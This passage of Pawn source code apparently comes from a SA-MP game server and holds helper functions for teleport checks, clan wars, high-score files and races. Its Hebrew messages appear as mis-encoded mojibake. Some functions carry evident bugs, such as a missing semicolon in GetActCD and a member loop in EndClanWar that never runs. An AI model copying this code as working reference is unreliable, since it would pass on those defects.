			case 'Ё': str[i] = 'b';
			case 'ю': str[i] = 'n';
			case 'Ў': str[i] = 'm';
			case 'є': str[i] = ';';
			case '·': str[i] = ',';
			case ''': str[i] = 'w';
		}
	}
	return str;
}
//=[CanBeTeleported]============================================================
stock CanBeTeleported(playerid)
{
	if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюЎс"), 0;
	if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° ыр∙° р·ф сЇЄщьх·"), 0;
	if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," /qdmz :ьр Ёщ·я ьф∙·т° ыр∙° р·ф срцх° ущ-рэ, ьщЎщрф"), 0;
	if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф ссчщ°· фуюхщх·"), 0;
	if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф сў°с Ї°шщ"), 0;
	if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф су°щЇш"), 0;
	if(playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф сющ°хї Ї°шщ"), 0;
    if(playerinfo[playerid][lhopt] != -1) return SendClientMessage(playerid, red, " .рщя рЇ∙°х· ьф∙·т° ыр∙° р·ф сютуьх°"), 0;
	if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє"), 0;
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюЄўс"), 0;
	if(playerinfo[playerid][incwar]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюьчю· ўьрЁщэ"), 0;
	if(!CanTeleportSVehicle(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° Єэ ф°ыс фцф"), 0;
	if(playerinfo[playerid][srstarted] || playerinfo[playerid][srin]) return SendClientMessage(playerid,red," /srstop :ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюшххч, ьфЇёўф ф∙·ю∙ сЇўхуф");
	if(playerinfo[playerid][test] != -1) return SendClientMessage(playerid,red," /qtest :ьр Ёщ·я ьф∙·т° ыр∙° р·ф срцх° шёшщэ, ьщЎщрф"), 0;
	if(playerinfo[playerid][inhouse] > -1) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° ыр∙° р·ф с·хъ сщ·"), 0;
	if(playerinfo[playerid][mission] != INVALID_MISSION_ID) return SendClientMessage(playerid, red, " .ьр Ёщ·я ьф∙·т° ыр∙° р·ф сю∙щюф"), 0;
	if(playerinfo[playerid][incbug][0]) return SendClientMessage(playerid,red," .C-Bug-ьр Ёщ·я ьф∙·т° ыр∙° р·ф с"), 0;
	return 1;
}
//=[IsPlayerAbleToCallVehicle]==================================================
stock IsPlayerAbleToCallVehicle(playerid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .сюЎсъ фЁхычщ рщЁъ щыхь ь∙т° р· ф°ыс ∙ьъ"), 0;
	if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != world_normal) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙т° ьыря р· ф°ыс"), 0;
	if(IsPlayerInRangeOfPoint(playerid,50.0,815.9630,-1101.8781,25.7905)) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙т° ьыря р· ф°ыс"), 0;
	if(GetPlayerCheckpoint(playerid) == cp_vstore) return SendClientMessage(playerid,red,".ьр Ёщ·я ь∙т° р· ф°ыс ьщу чЁх· фюыхЁщх·"), 0;
	if(playerinfo[playerid][castle] != INVALID_CASTLE_ID) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙т° р· ф°ыс с·хъ фшщ°ф");
	new cma = GetCloseMoneyArea(playerid);
	if(cma != -1)
	{
		new string[128];
		format(string,sizeof(string)," .%s ьр Ёщ·я ь∙т° р· ф°ыс ьщу рцх° ыёє, р·ф ў°хс ющу ьрцх°",MoneyAreas[cma][maName]);
		return SendClientMessage(playerid,red,string);
	}
	return 1;
}
//=[CanUseCommand]==============================================================
stock CanUseCommand(playerid)
{
	if(playerinfo[playerid][modeafk] || playerinfo[playerid][inact] ||
	playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none || playerinfo[playerid][reqclass] ||
	playerinfo[playerid][inbattle] || playerinfo[playerid][indrift] ||
	playerinfo[playerid][inprace] || playerinfo[playerid][incrane] ||
	GetPlayerState(playerid) == PLAYER_STATE_SPECTATING || playerinfo[playerid][incwar] ||
	playerinfo[playerid][ach][0] != -1 || playerinfo[playerid][srstarted] ||
	playerinfo[playerid][srin] || WaitingAct(playerid) ||
	playerinfo[playerid][test] != -1 || playerinfo[playerid][lhopt] != -1 ||
	playerinfo[playerid][incbug][0] || playerinfo[playerid][srstarted] ||
	playerinfo[playerid][inplane] || playerinfo[playerid][inarea51]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЎсъ фЁхычщ"), 0;
	return 1;
}
//=[CanUseDuel]==============================================================
stock CanUseDuel(playerid)
{
	if(playerinfo[playerid][modeafk] || playerinfo[playerid][inact] ||
	playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none || playerinfo[playerid][reqclass] ||
	playerinfo[playerid][inbattle] || playerinfo[playerid][indrift] ||
	playerinfo[playerid][inprace] || playerinfo[playerid][incrane] ||
	GetPlayerState(playerid) == PLAYER_STATE_SPECTATING || playerinfo[playerid][incwar] ||
	playerinfo[playerid][ach][0] != -1 || playerinfo[playerid][srstarted] ||
	playerinfo[playerid][srin] || WaitingAct(playerid) ||
	playerinfo[playerid][test] != -1 || playerinfo[playerid][lhopt] != -1 ||
	playerinfo[playerid][incbug][0]) return 0;
	return 1;
}
//=[WaitingAct]=================================================================
stock WaitingAct(playerid)
	return playerinfo[playerid][waitrace] || playerinfo[playerid][waitwar] ||
	playerinfo[playerid][waitwwe] || playerinfo[playerid][waitkart] ||
	playerinfo[playerid][waitmonster] || playerinfo[playerid][waitkickstar] ||
	playerinfo[playerid][waitwargame] || playerinfo[playerid][waitmanhunt] ||
	playerinfo[playerid][waitsrace] || playerinfo[playerid][waitewar] ||
	playerinfo[playerid][waitsport] || playerinfo[playerid][waitarmy] ||
	playerinfo[playerid][waitteamact];
//=[GetActCD]===================================================================
stock GetActCD()
{
	if(raceinfo[0]) return raceinfo[2]
	else if(warinfo[0]) return warinfo[2];
	else if(wweinfo[0]) return wweinfo[2];
	else if(kartinfo[0]) return kartinfo[2];
	else if(monsterinfo[0]) return monsterinfo[2];
	else if(sraceinfo[0]) return sraceinfo[2];
	else if(kickstarinfo[0]) return kickstarinfo[2];
	else if(ewarinfo[0]) return ewarinfo[2];
	else if(wargameinfo[0]) return wargameinfo[2];
	else if(manhuntinfo[0]) return manhuntinfo[2];
	else if(sportinfo[0]) return sportinfo[2];
	else if(armyinfo[0]) return armyinfo[2];
	else if(teamactinfo[0]) return teamactinfo[2];
	else if(zombiesinfo[0]) return zombiesinfo[2];
	else if(glassinfo[0]) return glassinfo[2];
	else if(briefcaseinfo[0]) return briefcaseinfo[2];
}
//=[GetPlayerStatus]============================================================
stock GetPlayerStatus(playerid)
{
	if(IsPlayerAFK_(playerid)) return status_afk;
	else if(playerinfo[playerid][inact]) return status_act;
	else if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return status_dmz;
	else if(playerinfo[playerid][reqclass]) return status_class;
	else if(playerinfo[playerid][inbattle]) return status_battle;
	else if(playerinfo[playerid][indrift]) return status_drift;
	else if(playerinfo[playerid][inprace]) return status_prace;
	else if(playerinfo[playerid][incrane]) return status_crane;
	else if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) return status_spec;
	else if(playerinfo[playerid][incwar] || claninfo[playerinfo[playerid][clan]][cruling][0] > 0) return status_cwar;
	else if(playerinfo[playerid][srstarted] || playerinfo[playerid][srin]) return status_sr;
	else if(playerinfo[playerid][test] != -1) return status_test;
	else if(playerinfo[playerid][curfight] >= 5) return status_fighting;
	else if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && playerinfo[playerid][pkmh] > 50) return status_driving;
	return status_none;
}
//=[EndClanWar]=================================================================
stock EndClanWar(winclan,loseclan,a)
{
	new string[M_S], al = 0, i = winclan;
	goto doit;
	doit:
	{
		claninfo[i][cwarasked] = {0,-1};
		claninfo[i][cinwar] = 0;
		claninfo[i][cwarcd] = 0;
		claninfo[i][cwarplayers] = 0;
		claninfo[i][cwarplayer][i] = INVALID_PLAYER_ID;
		for(new j = 0; j < claninfo[i][cwarplayers]; j++) if(IsPlayerConnected(claninfo[i][cwarplayer][j]) && playerinfo[claninfo[i][cwarplayer][j]][incwar])
		{
			playerinfo[claninfo[i][cwarplayer][j]][incwar] = 0;
			SpawnPlayer(claninfo[i][cwarplayer][j]);
			claninfo[i][cwarplayer][j] = INVALID_PLAYER_ID;
			al++;
		}
	}
	if(i == winclan)
	{
		i = loseclan;
		goto doit;
	}
	format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[winclan][cname]);
	fsetint(string,"WarWinTimes",++claninfo[winclan][cwintimes]);
	SendClientMessageToAll(lightblue," ~~~ !юьчю· фўьрЁщэ фё·щщюф ~~~");
	format(string,sizeof(string)," !сюьчю· фўьрЁщэ %s ЁщЎч р· фўьря %s фўьря",claninfo[loseclan][cname],claninfo[winclan][cname]);
	SendClientMessageToAll(yellow,string);
	format(string,sizeof(string)," [юЁЎч сюьчю· ўьрЁщэ %s ёхт фЁЎчхя: %s | цхфщ фЇЄэ ф %d ∙фўьря]",claninfo[winclan][cname],!a ? ("ЁЎчхя °тщь") : ("ЁЎчхя шыЁщ"),claninfo[winclan][cwintimes]);
	SendClientMessageToAll(yellow,string);
	return 1;
}
//=[KillsList]==================================================================
stock KillsList(sh=1)
{
 	new list_Player[MAX_PLAYERS], list_Kills[MAX_PLAYERS], list_Players = 0, string[M_S], string2[32], temp, temp2, temp3, tempstr[M_S], tempstr2[M_S];
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][logged]) list_Player[list_Players] = i, list_Kills[list_Players] = playerinfo[i][kills], list_Players++;
	if(list_Players >= 5)
	{
		for(new i = 0; i < list_Players; i++) for(new j = 0; j < i; j++) if(list_Kills[i] > list_Kills[j]) temp = list_Kills[i], list_Kills[i] = list_Kills[j], list_Kills[j] = temp, temp = list_Player[i], list_Player[i] = list_Player[j], list_Player[j] = temp;
		for(new i = 0; i < 5; i++)
		{
			temp = -1;
			if(IsPlayerListedInHSKills(list_Player[i]))
			{
				for(new j = 5; j >= 1 && temp == -1; j--)
				{
					format(string,sizeof(string),"HSKills_Name%d",j);
					if(equal(fgetstring(file_hskills,string),GetName(list_Player[i]))) temp = j;
				}
				format(string,sizeof(string),"HSKills%d",temp);
				if(fgetint(file_hskills,string) != list_Kills[i]) fsetint(file_hskills,string,list_Kills[i]);
				if(temp > 1) for(new j = temp-1; j >= 1; j--)
				{
					format(string,sizeof(string),"HSKills%d",j);
					if(list_Kills[i] > fgetint(file_hskills,string))
					{
						format(string,sizeof(string),"HSKills%d",j);
						format(string2,sizeof(string2),"HSKills%d",j+1); // to up
						temp2 = fgetint(file_hskills,string), temp3 = fgetint(file_hskills,string2);
						fsetint(file_hskills,string,temp3);
						fsetint(file_hskills,string2,temp2);
						format(string,sizeof(string),"HSKills_Name%d",j);
						format(string2,sizeof(string2),"HSKills_Name%d",j+1);
						format(tempstr,sizeof(tempstr),fgetstring(file_hskills,string));
						format(tempstr2,sizeof(tempstr2),fgetstring(file_hskills,string2));
						fsetstring(file_hskills,string,tempstr2);
						fsetstring(file_hskills,string2,tempstr);
					}
				}
			}
			else
			{
				for(new j = 5; j >= 1; j--)
				{
					format(string,sizeof(string),"HSKills%d",j);
					if(list_Kills[i] > fgetint(file_hskills,string)) temp = j;
				}
				if(temp != -1)
				{
					if(temp != 5) for(new j = 4; j >= temp; j--)
					{
						format(string,sizeof(string),"HSKills%d",j);
						format(string2,sizeof(string2),"HSKills%d",j+1);
						temp2 = fgetint(file_hskills,string);
						fsetint(file_hskills,string2,temp2);
						format(string,sizeof(string),"HSKills_Name%d",j);
						format(string2,sizeof(string2),"HSKills_Name%d",j+1);
						format(tempstr,sizeof(tempstr),fgetstring(file_hskills,string));
						fsetstring(file_hskills,string2,tempstr);
					}
					format(string,sizeof(string),"HSKills%d",temp);
					fsetint(file_hskills,string,list_Kills[i]);
					format(string,sizeof(string),"HSKills_Name%d",temp);
					fsetstring(file_hskills,string,GetName(list_Player[i]));
				}
			}
		}
	}
	if(sh)
	{
		SendClientMessageToAll(lightblue," ~~~ :шсь· ∙щрщ ф°щтх· ~~~");
		for(new i = 1; i <= 5; i++)
		{
			format(string,sizeof(string),"HSKills%d",i);
			format(string2,sizeof(string2),"HSKills_Name%d",i);
			format(string,sizeof(string)," Х %d. %s " @c(lightyellow) "(%d :ф°щтх·)",i,fgetstring(file_hskills,string2),fgetint(file_hskills,string));
			SendClientMessageToAll(yellow,string);
		}
	}
	return 1;
}
//=[IsPlayerListedInHSKills]====================================================
stock IsPlayerListedInHSKills(playerid)
{
	new string[128], n[24], File:f = fopen(file_hskills,io_read);
	format(n,sizeof(n),GetName(playerid));
	for(new i = 1; i <= 5; i++)
	{
		format(string,sizeof(string),"HSKills_Name%d=%s",i,n);
		if(fsearch(f,string))
		{
			fclose(f);
			return 1;
		}
	}
	fclose(f);
	return 0;
}
//=[ClansRulingList]============================================================
stock ClansRulingList()
{
 	new list_Clan[MAX_CLANS], list_WinTimes[MAX_PLAYERS], list_Clans = 0, string[M_S], string2[32], temp, temp2, temp3, tempstr[M_S], tempstr2[M_S];
	for(new i = 1; i <= MAXCLANS; i++) if(claninfo[i][cvalid]) list_Clan[list_Clans] = i, list_WinTimes[list_Clans] = claninfo[i][cruletimes], list_Clans++;
	if(list_Clans >= 5)
	{
		for(new i = 0; i < list_Clans; i++) for(new j = 0; j < i; j++) if(list_WinTimes[i] > list_WinTimes[j]) temp = list_WinTimes[i], list_WinTimes[i] = list_WinTimes[j], list_WinTimes[j] = temp, temp = list_Clan[i], list_Clan[i] = list_Clan[j], list_Clan[j] = temp;
		for(new i = 0; i < 5; i++)
		{
			temp = -1;
			if(IsClanListedInHSRuling(list_Clan[i]))
			{
				for(new j = 5; j >= 1 && temp == -1; j--)
				{
					format(string,sizeof(string),"HSWinTimes_Name%d",j);
					if(equal(fgetstring(file_hsruling,string),claninfo[list_Clan[i]][cname])) temp = j;
				}
				format(string,sizeof(string),"HSWinTimes%d",temp);
				if(fgetint(file_hsruling,string) != list_WinTimes[i]) fsetint(file_hsruling,string,list_WinTimes[i]);
				if(temp > 1) for(new j = temp-1; j >= 1; j--)
				{
					format(string,sizeof(string),"HSWinTimes%d",j);
					if(list_WinTimes[i] > fgetint(file_hsruling,string))
					{
						format(string,sizeof(string),"HSWinTimes%d",j);
						format(string2,sizeof(string2),"HSWinTimes%d",j+1); // to up
						temp2 = fgetint(file_hsruling,string), temp3 = fgetint(file_hsruling,string2);
						fsetint(file_hsruling,string,temp3);
						fsetint(file_hsruling,string2,temp2);
						format(string,sizeof(string),"HSWinTimes_Name%d",j);
						format(string2,sizeof(string2),"HSWinTimes_Name%d",j+1);
						format(tempstr,sizeof(tempstr),fgetstring(file_hsruling,string));
						format(tempstr2,sizeof(tempstr2),fgetstring(file_hsruling,string2));
						fsetstring(file_hsruling,string,tempstr2);
						fsetstring(file_hsruling,string2,tempstr);
					}
				}
			}
			else
			{
				for(new j = 5; j >= 1; j--)
				{
					format(string,sizeof(string),"HSWinTimes%d",j);
					if(list_WinTimes[i] > fgetint(file_hsruling,string)) temp = j;
				}
				if(temp != -1)
				{
					if(temp != 5) for(new j = 4; j >= temp; j--)
					{
						format(string,sizeof(string),"HSWinTimes%d",j);
						format(string2,sizeof(string2),"HSWinTimes%d",j+1);
						temp2 = fgetint(file_hsruling,string);
						fsetint(file_hsruling,string2,temp2);
						format(string,sizeof(string),"HSWinTimes_Name%d",j);
						format(string2,sizeof(string2),"HSWinTimes_Name%d",j+1);
						format(tempstr,sizeof(tempstr),fgetstring(file_hsruling,string));
						fsetstring(file_hsruling,string2,tempstr);
					}
					format(string,sizeof(string),"HSWinTimes%d",temp);
					fsetint(file_hsruling,string,list_WinTimes[i]);
					format(string,sizeof(string),"HSWinTimes_Name%d",temp);
					fsetstring(file_hsruling,string,claninfo[list_Clan[i]][cname]);
				}
			}
		}
	}
	SendClientMessageToAll(lightblue," ~~~ :шсь· ∙щрщ ф∙·ьшхщх· ўьрЁщэ ~~~");
	for(new i = 1; i <= 5; i++)
	{
		format(string,sizeof(string),"HSWinTimes%d",i);
		format(string2,sizeof(string2),"HSWinTimes_Name%d",i);
		format(string,sizeof(string)," Х %d. %s " @c(lightyellow) "(%d :ЁЎчхЁх·)",i,fgetstring(file_hsruling,string2),fgetint(file_hsruling,string));
		SendClientMessageToAll(yellow,string);
	}
	return 1;
}
//=[IsClanListedInHSRuling]=====================================================
stock IsClanListedInHSRuling(clanid)
{
	new string[128], frmt[32], File:f = fopen(file_hsruling,io_read);
	format(frmt,sizeof(frmt),claninfo[clanid][cname]);
	for(new i = 1; i <= 5; i++)
	{
		format(string,sizeof(string),"HSWinTimes_Name%d=%s",i,frmt);
		if(fsearch(f,string))
		{
			fclose(f);
			return 1;
		}
	}
	fclose(f);
	return 0;
}
//=[StopRaise]==================================================================
stock StopRaise(playerid)
{
	if(playerinfo[playerid][raise] != INVALID_PLAYER_ID)
	{
		new string[M_S], Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
		SetPlayerPos(playerinfo[playerid][raise],p[0],p[1],p[2]);
		format(string,sizeof(string)," .ю·Їщё· ·щў фёщьхя %s ∙щч°°· р·",GetName(playerinfo[playerid][raise]));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .∙ч°° рх·ъ ю·Їщё· ·щў фёщьхя %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][raise],green,string);
		playerinfo[playerinfo[playerid][raise]][raisef] = 0, playerinfo[playerinfo[playerid][raise]][raiseby] = INVALID_PLAYER_ID;
		playerinfo[playerid][raise] = INVALID_PLAYER_ID;
	}
}
//=[GetManhuntMaxPlayers]=======================================================
stock GetManhuntMaxPlayers()
{
	if(manhuntinfo[4] == 0) return sizeof(ManhuntCommandoPositions);
	else if(manhuntinfo[4] == 1) return sizeof(LVManhuntPositions);
	return 0;
}
//=[EndEWar]====================================================================
stock EndEWar(reason[],adminid)
{
	new string[M_S];
	assert ewarinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .фюьчюф схшьф");
	else format(string,sizeof(string)," .%s фюьчюф схшьф Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inewar] || playerinfo[i][waitewar]))
		{
			if(playerinfo[i][inewar])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙фрўёш°ф ххр° схшьф");
				GiveMoney(i,join_act);
			}
			playerinfo[i][inewar] = 0, playerinfo[i][waitewar] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	ewarinfo[0] = 0, ewarinfo[1] = 0, ewarinfo[2] = 0, ewarinfo[4] = 0;
	KillTimer(ewarinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[ShowClanStats]==============================================================
stock ShowClanStats(playerid,clanid,diaid,head[]="")
{
	new dia[1024], otherClanStatus[MAX_CLANS] = {0,...}, bool:areThereAny = false;
	for(new i = 1; i <= MAXCLANS; i++) if(claninfo[i][cvalid] && clanid != i)
	{
		if(claninfo[clanid][cpeace][i]) otherClanStatus[i] = 1;
		if(claninfo[clanid][cruler] == i) otherClanStatus[i] = 2;
		if(claninfo[i][cruler] == clanid) otherClanStatus[i] = 3;
		if(otherClanStatus[i] > 0 && !areThereAny) areThereAny = true;
	}
	format(dia,sizeof(dia),"{%s}╗ :ющуЄ Єь фўьря\n",ClanHexColor(clanid));
	format(dia,sizeof(dia),"%s\n" @c(white) "%s" @c(grey) " :∙э фўьря",dia,claninfo[clanid][cname]);
	//if(clanid == playerinfo[playerid][clan]) format(dia,sizeof(dia),"%s\n" @c(grey) "(" @c(grey) " ыюх· ∙чўЁщэ: " @c(white) "%d" @c(grey) " (ыхьь рх·ъ",dia,ClanPList_Count(clanid)-1);
	//else format(dia,sizeof(dia),"%s\n" @c(grey) "(/cplayers %s" @c(grey) " ыюх· ∙чўЁщэ: " @c(white) "%d" @c(grey) " (ьЎЇщщф с°∙щюф",dia,claninfo[clanid][cname],ClanPList_Count(clanid)-1);
	format(dia,sizeof(dia),"%s\n" @c(grey) "∙чўЁщэ ючхс°щэ ы°тЄ: " @c(white) "%d",dia,claninfo[clanid][cmembers]);
	format(dia,sizeof(dia),"%s\n" @c(grey) "Ї·хч ьшёшщэ: " @c(white) "%s",dia,claninfo[clanid][ctest] ? ("ыя") : ("ьр"));
	format(dia,sizeof(dia),"%s\n" @c(grey) "ф∙·ьшхщх· ∙фЎьщчх: " @c(white) "%d",dia,claninfo[clanid][cruletimes]);
	format(dia,sizeof(dia),"%s\n" @c(grey) "юьчюх· ∙ЁщЎчх: " @c(white) "%d",dia,claninfo[clanid][cwintimes]);
	if(areThereAny)
	{
		format(dia,sizeof(dia),"%s\n\n{%s}╗ :юЎс юхь ўьрЁщэ рч°щэ\n",dia,ClanHexColor(clanid));
		for(new i = 1, c = 0; i <= MAXCLANS; i++) if(otherClanStatus[i] > 0 && i != clanid)
		{
			c++;
			format(dia,sizeof(dia),"%s\n" @c(grey) "%d. {%s}%s" @c(grey) " - ",dia,c,ClanHexColor(i),claninfo[i][cname]);
			switch(otherClanStatus[i])
			{
				case 1: format(dia,sizeof(dia),"%s{0000FF}с∙ьхэ Єэ ўьря цф %s с°щ·: ўьря",dia,claninfo[clanid][cname]);
				case 2: format(dia,sizeof(dia),"%s{FF0000}Ё∙ьш Єь щущ ўьря цф %s фўьря",dia,claninfo[clanid][cname]);
				case 3: format(dia,sizeof(dia),"%s{00FF00}ф∙·ьш Єь ўьря цф %s ўьря",dia,claninfo[clanid][cname]);
			}
		}
	}
	if(claninfo[clanid][hashq])
	{
		format(dia,sizeof(dia),"%s\n\n{%s}╗ :юЇўуф\n",dia,ClanHexColor(clanid));
		format(dia,sizeof(dia),"%s\n" @c(grey) "°ысщэ: " @c(white) "%d",dia,claninfo[clanid][cvehicles]);
		format(dia,sizeof(dia),"%s\n" @c(grey) "рхсщщўшщэ: " @c(white) "%d",dia,claninfo[clanid][cobjects]);
		format(dia,sizeof(dia),"%s\n" @c(grey) "ЇщўрЇщэ: " @c(white) "%d",dia,claninfo[clanid][cpickups]);
		if(claninfo[clanid][cclosetele] != -1) format(dia,sizeof(dia),"%s\n" @c(grey) @c(white) "%s" @c(grey) " :∙щтх° ў°хс ьюЇўуф",dia,Teleports[claninfo[clanid][cclosetele]][Tcmd]);
	}
	if(diaid == dialog_ni)
	{
		new string[64];
		format(string,sizeof(string),"{%s}%s ыь фющуЄ Єь",ClanHexColor(clanid),claninfo[clanid][cname]);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,dia,"OK","");
	}
	else if(diaid == dialog_clan)
	{
		format(dia,sizeof(dia),"%s\n\n\n" @c(grey) ":\"ьющуЄ Єь ўьря рч° фўьу р· ∙юх хьчї \"ющуЄ",dia);
		ShowPlayerDialog(playerid,dialog_clan,DIALOG_STYLE_INPUT,head,dia,"ющуЄ","чцх°");
	}
	return 1;
}
//=[SetObjectToFaceCords]=======================================================
stock SetObjectToFaceCords(objectid,Float:x1,Float:y1,Float:z1)
{   // by LucifeR, improved by me
	new Float:x2, Float:y2, Float:z2;
	GetSObjectPos(objectid, x2,y2,z2);
	new Float:DX = floatabs(x2-x1), Float:DY = floatabs(y2-y1), Float:DZ = floatabs(z2-z1), Float:yaw = 0, Float:pitch = 0;
	if(DY == 0 || DX == 0)
	{
		if(DY == 0 && DX > 0) yaw = 0, pitch = 0;
		else if(DY == 0 && DX < 0) yaw = 180, pitch = 180;
		else if(DY > 0 && DX == 0) yaw = 90, pitch = 90;
		else if(DY < 0 && DX == 0) yaw = 270, pitch = 270;
		else if(DY == 0 && DX == 0) yaw = 0, pitch = 0;
	}
	else
	{
		yaw = atan(DX/DY), pitch = atan(floatsqroot(DX*DX + DZ*DZ) / DY);
		if(x1 > x2 && y1 <= y2) yaw += 90, pitch -= 45;
		else if(x1 <= x2 && y1 < y2) yaw = 90 - yaw, pitch -= 45;
		else if(x1 < x2 && y1 >= y2) yaw -= 90, pitch -= 45;
		else if(x1 >= x2 && y1 > y2) yaw = 270 - yaw, pitch += 315;
		if(z1 < z2) pitch = 360-pitch;
	}
	SetSObjectRot(objectid,0,0,yaw);
	SetSObjectRot(objectid,0,pitch,yaw);
}
//=[SetWeatherToIsraelWeather]==================================================
stock SetWeatherToIsraelWeather()
{
	//HTTP(ConsoleID,HTTP_GET,"www.cserver.co.il/actions/weather.php","","IsraelWeatherResponse");
	return 1;
}
//=[IsraelWeatherResponse]======================================================
forward IsraelWeatherResponse(index,response_code,data[]);
public IsraelWeatherResponse(index,response_code,data[])
{
	new string[M_S];
	if(response_code == 200)
	{
		israelWeather[0] = strval(data), israelWeather[1] = -1;
		switch(israelWeather[0])
		{
			case 1: israelWeather[1] = 3;
			case 2: israelWeather[1] = 7;
			case 3, 7, 8: israelWeather[1] = 8;
			case 4, 10, 12: israelWeather[1] = 8;
			case 5: israelWeather[1] = 0;
			case 6: israelWeather[1] = 4;
			case 9: israelWeather[1] = 15;
			case 11: israelWeather[1] = 18;
			case 13: israelWeather[1] = 19;
			case 14: israelWeather[1] = 2;
			case 15: israelWeather[1] = 17;
		}
		if(israelWeather[1] != -1)
		{
			SetWeather(serverWeather = israelWeather[1]);
			format(string,sizeof(string)," юцт фрхщ° с∙°· Єхуыя ьюцт фрхщ° сщ∙°рь срхЇя рхшхюшщ: " @c(white) "%s",GetWeatherName());
			SendClientMessageToAll(green,string);
		}
	}
	else
	{
		format(string,sizeof(string)," щ∙Ёф сЄщф сўсь· юцт фрхщ° сщ∙°рь. ўху фсЄщф: %d",response_code);
		SendClientMessageToAll(red,string);
	}
}
//=[SiteMeResponse]=============================================================
forward SiteMeResponse(index,response_code,data[]);
public SiteMeResponse(index,response_code,data[])
{
	if(response_code == 200) if(!strcmp(data,"False")) SendClientMessage(index,red," .фЎсЄ· ыс° фщхэ"); else if(!strcmp(data,"True")) SendClientMessage(index,green," !фЎсЄ· сфЎьчф ь∙°·, ·хуф");
	else SendClientMessage(index,red," .щ∙Ёф сЄщф сф·чс°х· ьр·°, рЁр Ёёф ∙хс юрхч° щх·°");
	return 1;
}
//=[GetRaceSpawnsCount]=========================================================
stock GetRaceSpawnsCount()
{
	new spawns = 0, bool:toBreak = false;
	#define racesp(%1,%2) if(raceinfo[6] == %2) for(new i = 0; i < sizeof(RacePositions_%1%2) && !toBreak; i++) if(RacePositions_%1%2[i][3] == 0.0) toBreak = true; else spawns++
	switch(raceinfo[4])
	{
		case race1_cars, race5_crazy, race6_tires, race7_invcars:
		{
			racesp(cars,1);
			racesp(cars,2);
			racesp(cars,3);
			racesp(cars,4);
			racesp(cars,5);
		}
		case race2_bikes:
		{
			racesp(bikes,1);
			racesp(bikes,2);
			racesp(bikes,3);
			racesp(bikes,4);
			racesp(bikes,5);
		}
		case race3_planes:
		{
			racesp(planes,1);
			racesp(planes,2);
			racesp(planes,3);
		}
		case race4_boats, race8_waterdrive:
		{
			racesp(boats,1);
			racesp(boats,2);
		}
	}
	#undef racesp
	return spawns;
}
//=[GetRaceCheckpointsCount]====================================================
stock GetRaceCheckpointsCount()
{
	new count = 0;
	#define racec(%1,%2) if(raceinfo[6] == %2) count = sizeof(RacePositions_%1%2)-1
	switch(raceinfo[4])
	{
		case race1_cars, race5_crazy, race6_tires, race7_invcars:
		{
			racec(cars,1);
			racec(cars,2);
			racec(cars,3);
			racec(cars,4);
			racec(cars,5);
		}
		case race2_bikes:
		{
			racec(bikes,1);
			racec(bikes,2);
			racec(bikes,3);
			racec(bikes,4);
			racec(bikes,5);
		}
		case race3_planes:
		{
			racec(planes,1);
			racec(planes,2);
			racec(planes,3);
		}
		case race4_boats, race8_waterdrive:
		{
			racec(boats,1);
			racec(boats,2);
		}
	}
	#undef racec
	return count;
}
//=[GetRaceMaxStyles]===========================================================
stock GetRaceMaxStyles(rtype)
{
	new maximum = 1;
	switch(rtype)
	{
		case race1_cars, race5_crazy, race6_tires, race7_invcars: maximum = 5;
		case race2_bikes: maximum = 5;
		case race3_planes: maximum = 3;
		case race4_boats, race8_waterdrive: maximum = 2;
	}
	return maximum;
}
//=[GenerateRandomString]=======================================================
